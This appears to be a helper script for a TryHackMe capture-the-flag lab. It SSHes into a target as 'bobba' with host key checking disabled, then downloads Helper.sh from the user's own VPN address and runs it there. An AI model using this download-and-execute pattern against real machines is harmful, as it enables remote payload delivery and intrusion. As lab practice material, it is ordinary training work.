#!/bin/bash

read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no bobba@"$ip_address" << EOF
    wget http://$vpn/Carnage/Helper.sh && chmod +x Helper.sh && ./Helper.sh $vpn   
EOF
